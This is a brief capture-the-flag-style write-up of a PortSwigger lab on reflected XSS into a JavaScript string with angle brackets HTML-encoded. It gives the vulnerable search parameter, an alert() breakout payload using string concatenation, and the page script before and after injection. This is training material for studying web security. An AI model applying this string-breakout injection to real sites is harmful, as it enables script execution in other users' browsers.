# Reflected XSS into a JavaScript string with angle brackets HTML encoded

# [Lab Link](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded)  

## Vulnerable Parameter:
```plaintext
https://0a3000d90470dae0823aab1f001b0041.web-security-academy.net/?search=
```

## Payload

```js
'-alert("Pwned by ruhan53c")-'
```

## Frontend

```js
var searchTerms = '';
```

## Frontend after payload


```js
var searchTerms = ''-alert("Pwned by ruhan53c")-'';  
```  



> ##### "We used -alert()- just for bypassing validation"
